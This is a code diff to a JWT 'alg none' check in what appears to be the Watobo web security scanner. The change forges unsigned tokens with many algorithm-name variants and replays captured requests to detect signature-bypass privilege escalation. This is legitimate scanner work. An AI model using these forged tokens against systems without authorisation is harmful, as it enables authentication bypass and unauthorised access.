@@ -7,12 +7,12 @@ module Watobo #:nodoc: all
         class Jwt_oauth2_none < Watobo::ActiveCheck
           @@tested_directories = Hash.new
 
-          threat =<<'EOF'
+          threat = <<'EOF'
 Privilege Escalation
 EOF
 
 #
-          details =<<'EOD'
+          details = <<'EOD'
 
 EOD
 
@@ -36,16 +36,17 @@ EOD
               :details => details
           )
 
-          def initialize(project, prefs={})
+          def initialize(project, prefs = {})
             super(project, prefs)
-
-            def reset
-
-            end
-
+            @test_algs = %w( NONE NULL ANONYMOUS ANON TEST NIL ZERO DEBUG)
+            @test_algs.concat @test_algs.map { |a| a.downcase }
+            @test_algs.concat @test_algs.map { |a| "\"#{a}\"" }
 
           end
 
+          def reset
+
+          end
 
           def generateChecks(chat)
             begin
@@ -57,46 +58,54 @@ EOD
               bearer_header = bearer.match(/^([^\s]*):/)[1]
               jwt = bearer.match(/Bearer (.*)/)[1]
               jh, jp, js = jwt.split('.')
-              jh = JSON.parse(Base64.decode64(jh))
-
-
-              jp = JSON.parse(Base64.decode64(jp))
+              jh = JSON.parse(Base64.urlsafe_decode64(jh))
+              jp = JSON.parse(Base64.urlsafe_decode64(jp))
 
               # remove 'alg' from original header
-              jh.delete 'alg'
+              #jh.delete 'alg'
+              @test_algs << "\"#{jh['alg']}\""
+
+              inj_pattern = '$$INJ$$'
+              jh['alg'] = inj_pattern
 
               # TODO: improve check to also compare responses which don't have a body
               body_orig = chat.response.body.to_s
               return true if body_orig.empty?
 
-              checker = proc {
-                request = nil
-                response = nil
-                test_request = chat.copyRequest
+              @test_algs.each do |test_alg|
+                checker = proc {
 
-                # create new token with original header fields - except 'alg'
-                token = JWT.encode jp, nil, 'none', jh
+                  test_request = chat.copyRequest
 
-                new_auth_header = "Bearer #{token}"
+                  # create new token with original header fields - except 'alg'
+                  #token = JWT.encode jp, nil, 'none', jh
+                  token = [Base64.urlsafe_encode64(jh.to_json.gsub(/.#{Regexp.quote(inj_pattern)}./, test_alg)).gsub(/[\n=]/, '')]
+                  token << Base64.urlsafe_encode64(jp.to_json).gsub(/[\n=]/, '')
+                  token << ''
 
-                test_request.set_header bearer_header, new_auth_header
+                  puts token
 
-                request, response = doRequest(test_request)
+                  new_auth_header = "Bearer #{token.join('.')}"
 
-                if response.body.to_s.strip == body_orig.strip
+                  test_request.set_header bearer_header, new_auth_header
 
-                  addFinding(request, response,
-                             :check_pattern => token,
-                             :proof_pattern => body_orig.strip,
-                             #:test_item => '',
-                             :chat => chat,
-                             :title => "[#{request.file}]"
-                  )
-                end
+                  request, response = doRequest(test_request)
 
-                [request, response]
-              }
-              yield checker
+                  if response.body.to_s.strip == body_orig.strip
+
+                    addFinding(request, response,
+                               :check_pattern => token,
+                               :proof_pattern => body_orig.strip,
+                               #:test_item => '',
+                               :chat => chat,
+                               :title => "[#{request.file}]"
+                    )
+                  end
+
+                  [request, response]
+                }
+                yield checker
+              end
 
             rescue => bang
               puts bang
